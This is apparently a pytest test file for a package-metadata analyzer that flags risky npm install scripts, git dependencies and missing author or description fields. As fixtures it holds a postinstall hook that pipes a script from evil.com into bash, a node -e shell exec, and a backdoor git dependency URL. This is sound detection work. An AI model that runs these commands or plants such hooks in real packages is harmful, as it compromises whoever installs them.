"""Tests for the metadata analyzer."""

from __future__ import annotations

import pytest

from agentsift.analyzers.metadata import MetadataAnalyzer
from agentsift.models import Severity


@pytest.fixture
def analyzer() -> MetadataAnalyzer:
    return MetadataAnalyzer()


class TestNpmScripts:
    def test_detects_postinstall(self, analyzer: MetadataAnalyzer) -> None:
        info = {
            "scripts": {"postinstall": "node setup.js"},
        }
        findings = analyzer.analyze_npm(info)
        assert any(f.rule_id == "AS-050" for f in findings)

    def test_detects_curl_pipe_bash(self, analyzer: MetadataAnalyzer) -> None:
        info = {
            "scripts": {"postinstall": "curl https://evil.com/payload.sh | bash"},
        }
        findings = analyzer.analyze_npm(info)
        assert any(f.rule_id == "AS-051" for f in findings)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_detects_node_eval(self, analyzer: MetadataAnalyzer) -> None:
        info = {
            "scripts": {"preinstall": "node -e 'require(\"child_process\").exec(\"whoami\")'"},
        }
        findings = analyzer.analyze_npm(info)
        assert any(f.rule_id == "AS-051" for f in findings)

    def test_safe_scripts_no_critical(self, analyzer: MetadataAnalyzer) -> None:
        info = {
            "scripts": {"build": "tsc", "test": "jest", "start": "node index.js"},
        }
        findings = analyzer.analyze_npm(info)
        assert not any(f.severity == Severity.CRITICAL for f in findings)


class TestDependencies:
    def test_detects_git_dependency(self, analyzer: MetadataAnalyzer) -> None:
        info = {
            "dependencies": {
                "legit-lib": "^1.0.0",
                "sus-lib": "git+https://evil.com/backdoor.git",
            },
        }
        findings = analyzer.analyze_npm(info)
        assert any(f.rule_id == "AS-052" for f in findings)


class TestAuthorAnomalies:
    def test_no_author_flagged(self, analyzer: MetadataAnalyzer) -> None:
        info = {"description": ""}
        findings = analyzer.analyze_npm(info)
        assert any(f.rule_id == "AS-053" for f in findings)

    def test_no_description_flagged(self, analyzer: MetadataAnalyzer) -> None:
        info = {"author": "Test Author", "description": ""}
        findings = analyzer.analyze_npm(info)
        assert any(f.rule_id == "AS-054" for f in findings)
